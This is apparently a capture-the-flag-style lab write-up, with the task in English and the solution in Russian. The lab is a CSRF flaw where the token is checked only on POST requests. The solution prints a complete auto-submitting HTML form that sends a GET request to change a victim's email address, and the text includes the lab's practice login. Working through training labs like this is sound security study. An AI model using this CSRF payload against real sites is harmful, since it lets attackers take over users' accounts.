# CSRF where token validation depends on request method
PRACTITIONER

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

## Решение
Вместо POST-запроса отправляю GET-запрос:
```
<html>
<body>
    <form action="https://0aed001404e7ce508319412700c30097.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="wiener123@normal-user.net" />
    </form>
    <script>document.forms[0].submit();</script>
</body>
</html>
```
Deliver exploit to victim -> задание выполнено.
